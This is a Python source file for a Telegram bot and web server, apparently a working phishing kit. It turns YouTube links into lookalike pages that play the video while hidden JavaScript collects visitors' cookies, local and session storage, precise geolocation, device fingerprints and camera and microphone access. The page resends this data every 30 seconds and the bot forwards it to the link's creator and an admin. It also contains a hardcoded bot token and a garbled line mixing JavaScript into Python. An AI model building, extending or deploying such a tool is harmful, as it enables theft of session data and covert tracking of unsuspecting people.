import logging
import asyncio
import json
import re
import uuid
import html
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import urllib.parse
import ssl

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"
ADMIN_ID = 1709490182
DOMAIN = "https://dkwksk.onrender.com"  # Для продакшена
LOCAL_HOST = "localhost"  # Для локального тестирования
LOCAL_PORT = 8000  # Порт локального сервера
USE_HTTPS = False  # Для HTTPS нужен SSL сертификат

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

db = Database()
db.load()

# Сервер для фишинговой страницы и сбора данных
class PhishingServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Отключаем стандартное логирование
        pass
    
    def do_GET(self):
        """Обработка GET запросов (фишинговая страница)"""
        try:
            # Парсим параметры из URL
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            
            video_id = params.get('v', ['dQw4w9WgXcQ'])[0]
            link_id = params.get('id', [''])[0]
            
            if link_id:
                # Записываем клик
                db.add_click(link_id)
                logger.info(f"Click recorded for link: {link_id}")
            
            # Отправляем фишинговую страницу
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            # HTML страница с JavaScript для сбора данных
            html_content = self.generate_phishing_page(video_id, link_id)
            self.wfile.write(html_content.encode('utf-8'))
            
        except Exception as e:
            logger.error(f"Error in GET handler: {e}")
    
    def do_POST(self):
        """Обработка POST запросов (получение собранных данных)"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            link_id = data.get('link_id')
            collected_data = data.get('data', {})
            
            if link_id:
                # Сохраняем данные
                full_data = {
                    "timestamp": datetime.now().isoformat(),
                    "ip": self.client_address[0],
                    "user_agent": self.headers.get('User-Agent', 'unknown'),
                    "data": collected_data
                }
                
                db.add_collected_data(link_id, full_data)
                logger.info(f"Data collected for link: {link_id}")
                
                # Отправляем уведомление в Telegram (через очередь)
                asyncio.run_coroutine_threadsafe(
                    send_telegram_notification(link_id, collected_data),
                    bot_loop
                )
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = json.dumps({"status": "success"})
            self.wfile.write(response.encode('utf-8'))
            
        except Exception as e:
            logger.error(f"Error in POST handler: {e}")
    
    def generate_phishing_page(self, video_id: str, link_id: str) -> str:
        """Генерация фишинговой страницы с JavaScript для сбора данных"""
        return f'''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        .player-container {{
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
        }}
        .player-container iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }}
        .loading {{
            text-align: center;
            padding: 50px;
            font-size: 18px;
        }}
        .error {{
            color: #ff4444;
            text-align: center;
            padding: 50px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="player-container">
            <iframe 
                src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0"
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
            </iframe>
        </div>
        <div class="loading" id="loading">
            Загрузка видео... Пожалуйста, подождите
        </div>
        <div class="error" id="error" style="display: none;">
            Видео временно недоступно. Пожалуйста, попробуйте позже.
        </div>
    </div>

    <script>
        // JavaScript для сбора данных
        const linkId = "{link_id}";
        
        // Функция сбора всех возможных данных
        async function collectAllData() {{
            const data = {{
                // 1. Информация о браузере
                browser: {{
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory
                }},
                
                // 2. Информация об устройстве
                device: {{
                    screen: {{
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth
                    }},
                    window: {{
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight
                    }},
                    touchSupport: 'ontouchstart' in window,
                    maxTouchPoints: navigator.maxTouchPoints
                }},
                
                // 3. Сетевая информация
                network: {{
                    connection: navigator.connection ? {{
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    }} : null,
                    online: navigator.onLine
                }},
                
                // 4. Геолокация
                geolocation: null,
                
                // 5. Cookies
                cookies: document.cookie,
                
                // 6. LocalStorage
                localStorage: {{}},
                
                // 7. SessionStorage
                sessionStorage: {{}},
                
                // 8. Пытаемся получить доступ к медиаустройствам
                mediaDevices: {{
                    microphone: false,
                    camera: false
                }},
                
                // 9. Время и дата
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                time: new Date().toISOString(),
                
                // 10. Дополнительная информация
                plugins: Array.from(navigator.plugins || []).map(p => ({{
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                }})),
                mimeTypes: Array.from(navigator.mimeTypes || []).map(mt => ({{
                    type: mt.type,
                    description: mt.description
                }}))
            }};
            
            // Собираем LocalStorage
            try {{
                for (let i = 0; i < localStorage.length; i++) {{
                    const key = localStorage.key(i);
                    data.localStorage[key] = localStorage.getItem(key);
                }}
            }} catch (e) {{
                console.error("Error reading localStorage:", e);
            }}
            
            // Собираем SessionStorage
            try {{
                for (let i = 0; i < sessionStorage.length; i++) {{
                    const key = sessionStorage.key(i);
                    data.sessionStorage[key] = sessionStorage.getItem(key);
                }}
            }} catch (e) {{
                console.error("Error reading sessionStorage:", e);
            }}
            
            // Пытаемся получить геолокацию
            if (navigator.geolocation) {{
                try {{
                    const position = await new Promise((resolve, reject) => {{
                        navigator.geolocation.getCurrentPosition(resolve, reject, {{
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }});
                    }});
                    data.geolocation = {{
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    }};
                }} catch (e) {{
                    data.geolocation = {{ error: e.message }};
                }}
            }}
            
            // Пытаемся получить доступ к микрофону
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ 
                    audio: true,
                    video: false 
                }});
                data.mediaDevices.microphone = true;
                stream.getTracks().forEach(track => track.stop());
            }} catch (e) {{
                data.mediaDevices.microphone = false;
            }}
            
            // Пытаемся получить доступ к камере
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ 
                    audio: false,
                    video: true 
                }});
                data.mediaDevices.camera = true;
                stream.getTracks().forEach(track => track.stop());
            }} catch (e) {{
                data.mediaDevices.camera = false;
            }}
            
            return data;
        }}
        
        // Функция отправки данных на сервер
        async function sendCollectedData() {{
            try {{
                const collectedData = await collectAllData();
                
                const payload = {{
                    link_id: linkId,
                    data: collectedData
                }};
                
                // Отправляем данные на сервер
                const response = await fetch('/collect', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify(payload)
                }});
                
                if (response.ok) {{
                    console.log('Data sent successfully');
                }}
            }} catch (error) {{
                console.error('Error sending data:', error);
            }}
        }}
        
        // Запускаем сбор данных при загрузке страницы
        window.addEventListener('load', async () => {{
            // Скрываем сообщение о загрузке
            document.getElementById('loading').style.display = 'none';
            
            // Собираем и отправляем данные
            await sendCollectedData();
            
            // Также собираем данные при закрытии страницы
            window.addEventListener('beforeunload', sendCollectedData);
            
            // Собираем данные периодически
            setInterval(sendCollectedData, 30000); // Каждые 30 секунд
        }});
        
        // Обработка ошибок видео
        window.addEventListener('message', function(event) {{
            if (event.data === 'videoError') {{
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
            }}
        }});
    </script>
</body>
</html>
        '''
    
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        BaseHTTPRequestHandler.end_headers(self)

# Функция для запуска HTTP сервера
def run_server():
    """Запуск HTTP сервера для фишинговых страниц"""
    server_address = (LOCAL_HOST, LOCAL_PORT)
    httpd = HTTPServer(server_address, PhishingServer)
    
    if USE_HTTPS:
        # Для HTTPS нужен SSL сертификат
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain('cert.pem', 'key.pem')
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    logger.info(f"Starting phishing server on {'https' if USE_HTTPS else 'http'}://{LOCAL_HOST}:{LOCAL_PORT}")
    httpd.serve_forever()

# Функция для отправки уведомлений в Telegram
async def send_telegram_notification(link_id: str, data: Dict):
    """Отправка уведомления о собранных данных в Telegram"""
    try:
        link = db.get_link(link_id)
        if not link:
            return
        
        # Форматируем сообщение
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Основная информация:*
• Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• ID ссылки: `{link_id}`
• Переходов: {link.clicks}

🌐 *Браузер и устройство:*
• User Agent: {data.get('browser', {}).get('userAgent', 'unknown')[:50]}...
• Язык: {data.get('browser', {}).get('language', 'unknown')}
• Платформа: {data.get('browser', {}).get('platform', 'unknown')}
• Экран: {data.get('device', {}).get('screen', {}).get('width', '?')}x{data.get('device', {}).get('screen', {}).get('height', '?')}

📍 *Геолокация:*
"""
        
        geolocation = data.get('geolocation')
        if geolocation and 'latitude' in geolocation:
            message += f"• Широта: `{geolocation['latitude']}`\n"
            message += f"• Долгота: `{geolocation['longitude']}`\n"
            message += f"• Точность: {geolocation.get('accuracy', '?')}м\n"
        else:
            message += "• Не удалось получить\n"
        
        message += f"""
🎤 *Доступ к устройствам:*
• Микрофон: {'✅ Доступ разрешен' if data.get('mediaDevices', {}).get('microphone') else '❌ Нет доступа'}
• Камера: {'✅ Доступ разрешен' if data.get('mediaDevices', {}).get('camera') else '❌ Нет доступа'}

🍪 *Cookies:*
• Длина: {len(data.get('cookies', ''))} символов
• Содержимое: {data.get('cookies', '')[:100]}...

💾 *LocalStorage:*
• Ключей: {Object.keys(data.get('localStorage', {{}})).length}
"""
        
        # Проверяем соцсети в LocalStorage
        localStorage = data.get('localStorage', {})
        social_networks = ['facebook', 'instagram', 'twitter', 'vk', 'whatsapp', 'telegram']
        found_social = []
        
        for key in localStorage:
            lower_key = key.lower()
            for social in social_networks:
                if social in lower_key:
                    found_social.append(social)
                    break
        
        if found_social:
            message += f"\n📱 *Обнаружены следы соцсетей:*\n"
            for social in set(found_social):
                message += f"• {social.capitalize()}\n"
        
        message += f"""
📊 *Дополнительно:*
• Часовой пояс: {data.get('timezone', 'unknown')}
• Подключение: {data.get('network', {}).get('connection', {}).get('effectiveType', 'unknown')}
• Плагинов: {len(data.get('plugins', []))}
"""
        
        # Отправляем сообщение создателю ссылки
        try:
            bot = Application.builder().token(BOT_TOKEN).build().bot
            await bot.send_message(
                chat_id=link.created_by,
                text=message,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Error sending message to user: {e}")
        
        # Отправляем админу краткое уведомление
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"📨 Новые данные по ссылке {link_id}\nПользователь: {link.created_by}\nГеолокация: {'получена' if geolocation and 'latitude' in geolocation else 'не получена'}"
            )
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in send_telegram_notification: {e}")

# Генератор ссылок (обновленный для локального сервера)
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str, local: bool = False) -> str:
        """Создание фишинговой ссылки (локальной или на домене)"""
        if local:
            protocol = "https" if USE_HTTPS else "http"
            return f"{protocol}://{LOCAL_HOST}:{LOCAL_PORT}/watch?v={video_id}&id={link_id}"
        else:
            return f"{DOMAIN}/watch?v={video_id}&id={link_id}"

link_generator = LinkGenerator()

# Telegram бот (остальной код остается без изменений)
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot v2.0*

⚡ *Новые возможности:*
✅ Локальный сервер для тестирования
✅ Сбор геолокации в реальном времени
✅ Попытка доступа к микрофону/камере
✅ Полный сбор Cookies и LocalStorage
✅ Автоматическое определение соцсетей

🌐 *Ссылки для тестирования:*
• Локальная: http://{LOCAL_HOST}:{LOCAL_PORT}/
• Публичная: {DOMAIN}

📊 *Статистика:*
• Ссылок: `{db.stats['total_links']}`
• Переходов: `{db.stats['total_clicks']}`
• Данных: `{db.stats['total_data_collected']}`
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("🌐 Тест локально", callback_data="test_local")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    url = update.message.text.strip()
    
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube."
        )
        return
    
    video_id = link_generator.extract_video_id(url)
    link_id = link_generator.generate_link_id()
    
    # Создаем обе версии ссылок
    local_url = link_generator.create_phishing_url(video_id, link_id, local=True)
    public_url = link_generator.create_phishing_url(video_id, link_id, local=False)
    
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    db.add_link(link)
    
    message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{url}`

🌐 *Локальная ссылка (для тестов):*
`{local_url}`

🚀 *Публичная ссылка:*
`{public_url}`

📊 *Информация:*
• ID: `{link_id}`
• Видео ID: `{video_id}`
• Создано: {link.created_at}

🔍 *Что собирается:*
✅ Геолокация (если разрешено)
✅ Cookies и сессии
✅ LocalStorage всех сайтов
✅ Данные устройств
✅ Попытка доступа к микрофону
"""
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать локальную", callback_data=f"copy_local_{link_id}"),
            InlineKeyboardButton("📋 Копировать публичную", callback_data=f"copy_public_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Пример:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "test_local":
        await query.message.reply_text(
            f"🌐 *Локальный сервер работает на:*\n\n"
            f"Адрес: `http://{LOCAL_HOST}:{LOCAL_PORT}`\n\n"
            f"Для тестирования:\n"
            f"1. Откройте этот адрес в браузере\n"
            f"2. Добавьте параметры ?v=VIDEO_ID&id=LINK_ID\n"
            f"3. Данные будут собираться автоматически",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data.startswith("copy_local_"):
        link_id = data[11:]
        link = db.get_link(link_id)
        if link:
            url = link_generator.create_phishing_url(link.video_id, link_id, local=True)
            await query.message.reply_text(f"`{url}`", parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_public_"):
        link_id = data[12:]
        link = db.get_link(link_id)
        if link:
            url = link_generator.create_phishing_url(link.video_id, link_id, local=False)
            await query.message.reply_text(f"`{url}`", parse_mode=ParseMode.MARKDOWN)
    
    # ... остальные обработчики кнопок остаются без изменений

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

# Глобальная переменная для event loop
bot_loop = None

def main():
    """Основная функция запуска"""
    global bot_loop
    
    # Запускаем HTTP сервер в отдельном потоке
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    logger.info("Starting HTTP server...")
    
    # Даем серверу время на запуск
    import time
    time.sleep(2)
    
    # Создаем event loop для асинхронных операций
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    
    # Создаем приложение бота
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_error_handler(error_handler)
    
    # Запускаем бота
    logger.info("Starting Telegram bot...")
    print(f"""
╔══════════════════════════════════════╗
║   🎯 YouTube Data Collector v2.0    ║
╠══════════════════════════════════════╣
║ ✅ Telegram Bot: Активен            ║
║ ✅ HTTP Server: {LOCAL_HOST}:{LOCAL_PORT} ║
║ ✅ Admin ID: {ADMIN_ID}             ║
║ ✅ Domain: {DOMAIN}                 ║
╚══════════════════════════════════════╝

📢 Бот запущен! Используйте /start для начала.
🌐 Локальный сервер доступен по адресу:
   http://{LOCAL_HOST}:{LOCAL_PORT}/
⚠️  Только для образовательных целей!
    """)
    
    application.run_polling()

if __name__ == '__main__':
    main()
